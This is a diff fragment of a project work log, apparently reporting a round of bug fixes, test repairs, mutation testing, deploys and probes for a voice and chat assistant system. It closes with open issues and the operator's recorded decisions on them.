+- **MAJOR — cache-bust.** `app.js` stayed `?v=13.6`, which browsers cache as immutable for a year, so no returning browser would get any web fix. Fixed: app/matrix_graph 13.7, style 6.5.
+- **MAJOR — first sanitizer fix incomplete:** 7 fetch routes still open.
+- **Minor:**
+  - a TTS 429 dropped the uConsole's speech (hence the split pools and wait list);
+  - push could freeze forever;
+  - sequential SIGTERM notices could outrun launchd;
+  - "lost" was said during an image upload;
+  - the repair's owner protection read the stamp, not the index;
+  - its window was a day (now an hour);
+  - a soft stop hid real drops;
+  - task-list checkboxes were stripped;
+  - the CLI said "holding" with nothing held.
+- **Tests:** 3 vacuous tests (substring PDF pin, unpinned `main_task.cancel`, unpinned error echo) and a slot test that hung instead of failing.
+- **Mine:**
+  - an empty `grep -l` list ran the whole suite serially (again);
+  - a `sleep 30.4ml7` child test passed vacuously (invalid argument);
+  - the battery NOOP was KILLED twice: no `requirements.txt` in the tree, then the CLI symlink test, which is environment-bound and now deselected in the runner;
+  - 20 new source-text pins tripped the §4GJ ratchet. Converted to AST, behavioural or Playwright checks; the count is back to the baseline.
+
+**Verification:**
+- `tests/test_4ml_interfaces.py`: 43 tests (node, Playwright Chromium, the real Slack `main()` under SIGTERM in a subprocess). `test_ghost_cli.py::TestInterfaces4ML`: 5 tests.
+- Battery bat59: 38 mutants, all killed; NOOP survives; tree pristine.
+- Full suite once after the last code edit: **29,077 passed, 0 failed** (only tests and the ratchet changed after it; they were re-run, 216 passed). Interface suites: 728 passed.
+
+**Deploy (each gated on idle):**
+- agent 73225 → 95151 (bootout, repair, bootstrap; one process; flags present; 0 errors);
+- web client 850 → 95329 (serves `app.js?v=13.7`, vendored three.js; no CDN);
+- Slack bot restarted (index fixture `C1234567:8.8` removed, 260 entries);
+- ClockworkPi: `deploy.sh`, the device probe passed 99/99 (incl. the foreign-corridor check), pid 14461 stable; device files matched the repo before deploy.
+
+**Probes:**
+- STT 0.2 s → `""` (floor logged, no nova call);
+- TTS 200;
+- `ghost --probe` → `probe-39 … · probe`.
+
+**Open (operator):**
+- `:8080` binds `0.0.0.0` and was reached by internet scanners before 09-25 (auth held). The uConsole reaches `:8080` over the tailnet.
+- `~/.ghost_history` holds 2,015 test-written "hello"/"world" lines.
+- Graph triplets from member turns cannot be attributed.
+- All channel members share one identity at the agent (one file pool).
+- The Slack live-status tracker matches on 2 hex chars of the id.
+
+### §4ML operator decisions (2026-10-08, operator: "1 leave it as is 2 delete them 3 it's ok")
+1. `:8080` keeps binding `0.0.0.0`.
+2. The 2,015 test-written "hello"/"world" entries were deleted from `~/.ghost_history`: 2,996 → 981 entries, file mode 0600. prompt_toolkit loads the file cleanly.
+3. Graph triplets from member turns, the shared member identity and the 2-hex status match are accepted as is.
